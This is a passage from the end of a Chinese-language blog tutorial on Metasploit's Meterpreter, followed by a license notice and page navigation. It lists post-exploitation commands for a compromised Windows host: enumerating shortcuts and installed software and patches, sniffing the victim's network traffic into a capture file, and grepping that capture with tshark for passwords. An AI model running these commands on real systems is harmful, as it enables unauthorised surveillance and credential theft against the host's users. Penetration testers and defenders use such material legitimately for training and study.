+meterpreter &gt; run post/windows/gather/dumplinks
+<span class="c"># 获取目标主机安装的软件、安全更新与漏洞补丁信息</span>
+meterpreter &gt; run post/windows/gather/enum_applications
+</code></pre></div><h3 id="抓取目标主机网络流量">抓取目标主机网络流量</h3><p>使用sniffer可以获取用户网络IO流量，用于分析目标主机网络数据。</p><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 查看目标主机网络接口</span>
+meterpreter &gt; sniffer_interfaces
+<span class="c"># 指定网卡编号进行嗅探抓包</span>
+meterpreter &gt; sniffer_start 1 30000
+<span class="c"># 查看当前抓包的情况</span>
+meterpreter &gt; sniffer_stats 1
+<span class="c"># 将流量数据写入cap文件</span>
+meterpreter &gt; sniffer_dump 1 /tmp/capture.cap
+<span class="c"># 关闭嗅探</span>
+meterpreter &gt; sniffer_stop 1
+
+<span class="c"># 使用tshark分析cap数据包获取私密信息</span>
+<span class="o">[</span>root@kalibook 00:06:56 ~]# tshark -r /tmp/capture.cap | grep PASS
+<span class="c"># 使用wireshark分析cap数据包</span>
+<span class="o">[</span>root@kalibook 00:06:56 ~]# wireshark /tmp/capture.cap
+</code></pre></div><div class="divider"></div><blockquote id='by-nc-nd'><div> 版权所有，本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/3.0/">知识共享署名-非商业性使用 3.0 未本地化版本许可协议</a>进行许可。转载请注明出处：<a href="http://www.vinny.cc//2016/06/meterpreter/" akt="">http://www.vinny.cc//2016/06/meterpreter/</a></div></blockquote><div class="divider"></div><a class="w-search active" href="#" title="forward to search">⊙</a> <a class="w-catalog active" href="javascript:void(0);" title="open to catalog">≣</a></article><div class="page-navigation"> <a class="next" href="/2016/06/sql-developer-mysql/" title="NEXT: SQLDeveloper启用对mysql管理模式">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="/" title="Back to Homepage">Home</a> <span> &middot; </span> <a class="prev" href="/2016/05/kali-root-autologin/" title="PREV: kali中设置root用户自动登录">&gt;&gt;</a></div></main><div class="footer"> <!-- <span class="block">Made with &hearts; using <a href="http://jekyllrb.com/">Jekyll</a> &amp; <a href="https://github.com/heiswayi/the-plain" title="The Plain theme by Heiswayi Nrird">The Plain</a> &middot; &lt;/&gt; on <a href="https://github.com/wangjunneil" title="Hosted on GitHub">GitHub</a></span> --> <span class="block"><a href="https://vinny.cc">Vinny's Blog</a> © 2017 - All Rights Reserved</span></div><!-- include baidu_tongji.html include baidu_push.html include 360_push.html include google_analytics.html --></body></html>
